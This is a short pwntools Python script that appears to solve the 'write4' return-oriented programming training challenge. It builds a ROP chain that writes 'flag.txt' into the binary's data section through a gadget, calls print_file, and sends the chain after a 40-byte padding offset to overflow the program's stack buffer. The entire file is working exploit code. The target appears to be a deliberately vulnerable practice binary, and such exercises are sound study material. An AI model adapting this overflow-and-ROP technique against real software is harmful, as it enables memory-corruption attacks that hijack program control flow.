from pwn import *

context.binary = "./write4"
elf = context.binary
io = process(elf.path)
rop = ROP(elf)

rop(r14=elf.sym["data_start"], r15=b"flag.txt", rdi=elf.sym["data_start"])
rop.call(elf.sym["usefulGadgets"])
rop.call(elf.sym["print_file"])

chain = rop.chain()

io.clean()
io.fit({40: chain})
print(io.clean().decode())
